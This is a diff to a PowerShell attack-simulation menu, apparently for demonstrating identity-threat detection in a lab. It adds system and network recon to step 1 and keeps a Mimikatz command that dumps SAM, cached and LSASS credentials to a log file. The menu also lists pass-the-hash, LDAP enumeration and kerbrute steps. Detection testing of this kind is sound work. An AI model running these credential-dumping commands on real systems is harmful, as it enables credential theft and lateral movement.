@@ -1,4 +1,4 @@
-﻿﻿# ============================================================
+﻿﻿﻿# ============================================================
 #  Identity Attack Menu - Unmanaged Workstation
 #  Run as Administrator (demo account)
 #  Follows the phased scenario from portable_sender.py
@@ -57,7 +57,7 @@ function Show-Menu {
     Write-Host "  All steps use NTLM hashes (Pass-the-Hash) - no cleartext password needed" -ForegroundColor DarkGray
     Write-Host
     Write-Host "  --- Phase 2: Initial Access (after brute force to unmanaged) ---" -ForegroundColor Yellow
-    Write-Host "  1: Dump local credentials (SAM + cached)        [Find clark.monroe NTLM]"
+    Write-Host "  1: System recon + credential dump                [whoami, sysinfo, dump NTLM]"
     Write-Host "  2: Network discovery (ARP + port scan)           [Find DC, DT, BL on subnet]"
     Write-Host "  3: LDAP recon via PtH (enumerate AD)             [Discover svc_runbook, groups]"
     Write-Host "  4: Credential Scanning (kerbrute via PtH)        [CredentialScanning detection]"
@@ -85,8 +85,28 @@ do {
 
         '1' {
             Clear-Host
-            Write-Host "[Step 1] Dumping local credentials (SAM + cached)" -ForegroundColor Cyan
-            Write-Host "         Looking for cached domain accounts on this unmanaged host..." -ForegroundColor Gray
+            Write-Host "[Step 1] System Recon + Credential Dump" -ForegroundColor Cyan
+            Write-Host "         Enumerating system info and dumping cached credentials..." -ForegroundColor Gray
+            Write-Host
+
+            # --- Basic recon ---
+            Write-Host "--- Who am I? ---" -ForegroundColor Yellow
+            whoami /all
+            Write-Host
+
+            Write-Host "--- System Info ---" -ForegroundColor Yellow
+            Write-Host "  Hostname : $env:COMPUTERNAME" -ForegroundColor White
+            Write-Host "  OS       : $((Get-CimInstance Win32_OperatingSystem).Caption)" -ForegroundColor White
+            Write-Host "  Domain   : $((Get-CimInstance Win32_ComputerSystem).Domain)" -ForegroundColor White
+            Write-Host "  Joined   : $((Get-CimInstance Win32_ComputerSystem).PartOfDomain)" -ForegroundColor White
+            Write-Host
+
+            Write-Host "--- Network Config ---" -ForegroundColor Yellow
+            ipconfig /all | Select-String "IPv4|Subnet|Gateway|DNS Servers|DHCP Server"
+            Write-Host
+
+            Write-Host "--- Local Admins ---" -ForegroundColor Yellow
+            net localgroup Administrators
             Write-Host
 
             Write-Host "--- User profiles on this machine ---" -ForegroundColor Yellow
@@ -95,6 +115,8 @@ do {
             Write-Host "--- Local accounts ---" -ForegroundColor Yellow
             net user
 
+            # --- Credential dump ---
+            Write-Host "--- Mimikatz Credential Dump ---" -ForegroundColor Yellow
             & $mimiExe "privilege::debug" "token::elevate" "log $idpDir\step1_cred_dump.log" "lsadump::sam" "lsadump::cache" "sekurlsa::logonpasswords" "exit"
 
             Write-Host "`n[+] Output saved to: $idpDir\step1_cred_dump.log" -ForegroundColor Green
